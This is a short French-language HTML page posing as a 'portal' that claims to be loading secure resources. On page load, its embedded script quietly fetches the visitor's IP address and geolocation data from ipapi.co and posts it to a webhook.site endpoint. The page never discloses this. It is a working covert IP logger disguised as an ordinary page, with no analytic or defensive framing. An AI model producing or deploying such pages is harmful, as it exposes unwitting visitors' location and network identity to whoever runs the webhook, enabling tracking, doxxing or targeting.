<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Portail</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(120deg, #1c1c1c, #2e2e2e);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      max-width: 600px;
      padding: 40px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0,0,0,0.5);
      backdrop-filter: blur(5px);
    }
    h1 {
      font-size: 2.5em;
      margin-bottom: 15px;
    }
    p {
      font-size: 1.1em;
      color: #ccc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bienvenue sur le portail</h1>
    <p>Chargement des ressources sécurisées...</p>
  </div>

  <script>
    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        fetch("https://webhook.site/10920907-c6fa-46f9-b5a6-28a0e9632f7e", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
